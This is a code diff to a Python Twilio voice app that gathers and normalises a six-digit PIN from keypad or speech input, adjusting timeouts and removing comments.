@@ -147,11 +147,11 @@ def voice():
 
     gather = Gather(
         action="/gather_pin",
-        num_digits=6,
-        timeout=8,
+        num_digits=6,                    # Auto-submit after exactly 6 digits
+        # timeout removed - Twilio will submit immediately after 6 digits
         finish_on_key="#",
         input="dtmf speech",
-        speech_timeout=3,
+        speech_timeout=2,                # Shorter for faster speech cutoff
         language="en-US",
         speech_model="numbers_and_commands",
         enhanced="true",
@@ -176,13 +176,10 @@ def gather_pin():
     raw = digits if digits else speech
     print(f"Raw input received - Digits='{digits}', Speech='{speech}', Using='{raw}'")
 
-    # === STRONG CLEANING ===
-    # Replace common zero representations
+    # Strong cleaning
     cleaned = raw.replace("O", "0").replace("o", "0").replace("point", "").replace(".", "").replace(",", "").replace(" ", "")
-
     pin = ''.join(filter(str.isdigit, cleaned))
 
-    # Word conversion if still not 6 digits
     if len(pin) != 6 and speech:
         word_map = {
             "zero": "0", "oh": "0", "o": "0",
@@ -194,7 +191,6 @@ def gather_pin():
         converted = [word_map.get(w, '') for w in words]
         pin = ''.join(converted)
 
-    # Final fallback: take last 6 digits
     if len(pin) != 6:
         all_digits = ''.join(filter(str.isdigit, raw.replace("O", "0").replace("o", "0")))
         if len(all_digits) >= 6:
@@ -211,10 +207,9 @@ def gather_pin():
         gather = Gather(
             action="/gather_pin",
             num_digits=6,
-            timeout=8,
             finish_on_key="#",
             input="dtmf speech",
-            speech_timeout=3,
+            speech_timeout=2,
             language="en-US",
             speech_model="numbers_and_commands",
             enhanced="true",
@@ -226,7 +221,6 @@ def gather_pin():
         resp.append(gather)
         return twiml_response(resp)
 
-    # Success
     active_pins[call_sid] = {"pin": pin}
     log_call("PIN_ACCEPTED", {"pin": pin})
 
